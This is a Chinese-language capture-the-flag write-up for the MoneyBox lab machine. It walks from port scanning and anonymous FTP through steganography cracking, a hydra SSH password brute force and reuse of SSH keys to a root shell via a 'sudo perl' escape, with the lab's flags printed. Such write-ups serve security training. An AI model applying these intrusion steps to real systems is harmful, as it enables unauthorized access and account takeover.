## MoenyBox渗透测试过程

> 靶机IP：`192.168.56.120`

### 端口扫描

```bash
nmap -Pn -sV -sC 192.168.56.120
```

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.56.101
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1e:30:ce:72:81:e0:a2:3d:5c:28:88:8b:12:ac:fa:ac (RSA)
|   256 01:9d:fa:fb:f2:06:37:c0:12:fc:01:8b:24:8f:53:ae (ECDSA)
|_  256 2f:34:b3:d0:74:b4:7f:8d:17:d2:37:b1:2e:32:f7:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: MoneyBox
MAC Address: 08:00:27:44:2E:1D (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

ftp服务是可以`Anonymous`登陆的

```bash
ftp 192.168.56.120
Connected to 192.168.56.120.
220 (vsFTPd 3.0.3)
Name (192.168.56.120:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||54909|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg
226 Directory send OK.
ftp> get trytofind.jpg
```

给了一图片，猜测可能有隐写

尝试使用steghide

```bash
steghide info trytofind.jpg                      
"trytofind.jpg":
  format: jpeg
  capacity: 64.2 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

发现密码不正确，尝试爆破

```bash
┌──(root㉿kali)-[/home/kali/MoneyBox]
└─# time stegseek trytofind.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.62% (132.9 MB)           
[!] error: Could not find a valid passphrase.

real    5.17s
user    6.89s
sys     2.95s
cpu     190%
```

爆破不出来

### 目录扫描

```bash
┌──(root㉿kali)-[/home/kali/MoneyBox]
└─# dirsearch -u http://192.168.56.120/
[04:05:21] 301 -  316B  - /blogs  ->  http://192.168.56.120/blogs/
```

访问该目录，发现以下内容

```bash
curl http://192.168.56.120/blogs/
```

```html
<html>
<head><title>MoneyBox</title></head>
<body>
    <h1>I'm T0m-H4ck3r</h1><br>
        <p>I Already Hacked This Box and Informed.But They didn't Do any Security configuration</p>
        <p>If You Want Hint For Next Step......?<p>
</body>
</html>

<!--the hint is the another secret directory is S3cr3t-T3xt-->
```

接着访问`S3cr3t-T3xt`目录

```bash
curl http://192.168.56.120/S3cr3t-T3xt/
```

```html
<html>
<head><title>MoneyBox</title></head>
<body>
    <h1>There is Nothing In this Page.........</h1>
</body>
</html>
<!..Secret Key 3xtr4ctd4t4 >
```

得到key：`3xtr4ctd4t4`

### steghide分离文件

尝试分离图片中的内容

```bash
┌──(root㉿kali)-[/home/kali/MoneyBox]
└─# steghide extract -sf trytofind.jpg -p 3xtr4ctd4t4
wrote extracted data to "data.txt".
```

查看内容

```
Hello.....  renu

      I tell you something Important.Your Password is too Week So Change Your Password
Don't Underestimate it.......
```

得到一个名字`renu`，并且她的密码是弱密码，尝试SSH爆破

### SSH爆破和登录

```bash
hydra -l renu -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt ssh://192.168.56.120
```

```
[22][ssh] host: 192.168.56.120   login: renu   password: 987654321
```

得到user1.txt

```bash
renu@MoneyBox:~$ cat user1.txt         
Yes...!                                                  
You Got it User1 Flag
 ==> us3r1{F14g:0ku74tbd3777y4
```

进入lily的家目录，得到user2.txt

```
renu@MoneyBox:/home/lily$ cat user2.txt                                                  
Yeah.....                                                          
You Got a User2 Flag
==> us3r{F14g:tr5827r5wu6nklao}
```

发现lily的`.ssh`目录存在renu的公钥

```bash
renu@MoneyBox:/home/lily/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRIE9tEEbTL0A+7n+od9tCjASYAWY0XBqcqzyqb2qsNsJnBm8cBMCBNSktugtos9HY9hzSInkOzDn3RitZJXuemXCasOsM6gBctu5GDuL882dFgz962O9TvdF7JJm82eIiVrsS8YCVQq43migWs6HXJu+BNrVbcf+xq36biziQaVBy+vGbiCPpN0JTrtG449NdNZcl0FDmlm2Y6nlH42zM5hCC0HQJiBymc/I37G09VtUsaCpjiKaxZanglyb2+WLSxmJfr+EhGnWOpQv91hexXd7IdlK6hhUOff5yNxlvIVzG2VEbugtJXukMSLWk2FhnEdDLqCCHXY+1V+XEB9F3 renu@debian
```

登录到lily

```bash
renu@MoneyBox:~$ ssh lily@0
```

### perl提权

lily可以无密码使用`perl`

```bash
lily@MoneyBox:~$ sudo -l
Matching Defaults entries for lily on MoneyBox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lily may run the following commands on MoneyBox:
    (ALL : ALL) NOPASSWD: /usr/bin/perl
```

```bash
sudo perl -e 'exec "/bin/bash" '
```

得到root权限

```
root@MoneyBox:~# cat .root.txt 

Congratulations.......!

You Successfully completed MoneyBox

Finally The Root Flag
    ==> r00t{H4ckth3p14n3t}

I'm Kirthik-KarvendhanT
    It's My First CTF Box
         
instagram : ____kirthik____

See You Back....
```

### 总结

> 1.steghide分离文件 `steghide extract -sf 图片 -p 密码`
>
> 2.stegseek爆破 `time stegseek trytofind.jpg /usr/share/wordlists/rockyou.txt`
>
> 3.perl提权 `sudo perl -e 'exec "/bin/bash" '`
